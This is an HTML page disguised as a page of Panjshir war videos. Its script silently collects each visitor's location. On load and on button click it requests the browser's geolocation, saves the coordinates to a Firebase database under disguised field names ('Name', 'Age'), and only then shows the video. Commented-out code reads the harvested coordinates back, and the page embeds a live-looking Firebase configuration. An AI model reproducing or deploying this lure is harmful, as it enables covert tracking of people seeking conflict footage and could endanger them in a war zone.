<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Images</title>
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="./style.css" />
</head>

<body>
    <div class="App">
        <header class="App-header">
            <!-- په مهربانی سره لاندی کلیک وکړی!
            <br />
            &#10549;
            <button class='btn' onclick="findperson()">کتل</button> -->
            <!-- <button class='btn btn-primary' onclick="saveTest()">کتل</button> -->
            <iframe id="video" style="display: none;" width="853" height="480"
                src="https://www.youtube.com/embed/Q-qqkeD7pDQ" title="YouTube video player" frameborder="0"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen></iframe>
            <div class="btn btn-primary btn-lg" id="button">ویدیوهای جدید جنګ پنجشیر</div>
            <div id="result">

            </div>
        </header>
    </div>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics.js"></script>
    </script>
</body>

</html>
<script type="module">
    // Import the functions you need from the SDKs you need
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
    import { getFirestore, addDoc, setDoc, doc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
    // TODO: Add SDKs for Firebase products that you want to use
    // https://firebase.google.com/docs/web/setup#available-libraries

    // Your web app's Firebase configuration
    const firebaseConfig = {
        apiKey: "AIzaSyBzU2T7WcCiETXLz1wSBEqtP8DSuutpEgs",
        authDomain: "locationsystem-b3d81.firebaseapp.com",
        projectId: "locationsystem-b3d81",
        storageBucket: "locationsystem-b3d81.appspot.com",
        messagingSenderId: "625254395363",
        appId: "1:625254395363:web:07d3702515e494e32f84d6"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    // Initialize Cloud Firestore and get a reference to the service
    const db = getFirestore(app);
    const video = document.querySelector('#video');

    document.addEventListener('DOMContentLoaded', function () {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(show)
            function show(eValue) {
                addDoc(collection(db, "users"), {
                    Name: "founded",
                    Age: eValue.coords.latitude + ',' + eValue.coords.longitude
                });
                video.style.display = 'block';
            }
        }
    })

    document.querySelector('#button').addEventListener('click', function () {
        // window.location.reload();
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(show)
            function show(eValue) {
                addDoc(collection(db, "users"), {
                    Name: "founded",
                    Age: eValue.coords.latitude + ',' + eValue.coords.longitude
                });
                video.style.display = 'block';
            }
        }
    })


    // ---------------------read Data from Firebase
    // const q = query(collection(db, "users"), where("Name", "==", 'founded'));

    // const querySnapshot = await getDocs(q);
    // querySnapshot.forEach(element => {
    //     const allData = element.data().Age
    //     const div = document.createElement('div');
    //     div.appendChild(document.createTextNode(allData));
    //     document.querySelector('#result').appendChild(div)
    // });


    // ---------------------END read Data from Firebase
</script>